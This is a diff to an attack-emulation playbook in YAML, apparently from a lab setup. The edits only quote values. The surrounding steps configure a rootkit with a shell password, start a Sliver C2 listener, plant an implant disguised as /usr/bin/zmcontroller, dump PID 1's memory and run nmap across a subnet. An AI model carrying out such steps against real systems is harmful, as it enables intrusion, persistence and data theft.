@@ -37,7 +37,7 @@ commands:
     env_var: "AECID"
     file_prefix: "hiyw"
     # group: fax
-    gid: 21
+    gid: "21"
     shell_pass: "haveityourway"
     install_path: $FATHER_INSTALLPATH
     local_path: $FATHERCHROOT/rootjail/tmp
@@ -61,17 +61,17 @@ commands:
 
   - type: sliver
     cmd: start_https_listener
-    host: 0.0.0.0
-    port: 443
+    host: "0.0.0.0"
+    port: "443"
 
   - type: shell
     cmd: ls $IMPLANTPATH
 
   - type: sftp
     cmd: put
-    local_path: "$IMPLANTPATH"
+    local_path: $LAST_SLIVER_IMPLANT
     remote_path: /usr/bin/zmcontroller
-    mode: 755
+    mode: "755"
     session: "root"
    
 
@@ -144,7 +144,7 @@ commands:
 
   - type: sliver-session
     cmd: process_dump
-    pid: 1
+    pid: "1"
     session: superimplant
     local_path: $TEMPPROCDUMP
 
@@ -230,7 +230,7 @@ commands:
     cmd: execute
     exe: chmod
     args:
-      - 755
+      - "755"
       - /tmp/nmap
     session: superimplant
 
@@ -238,5 +238,5 @@ commands:
     cmd: execute
     exe: /tmp/nmap
     args:
-      - 172.17.100.0/24
+      - "172.17.100.0/24"
     session: superimplant
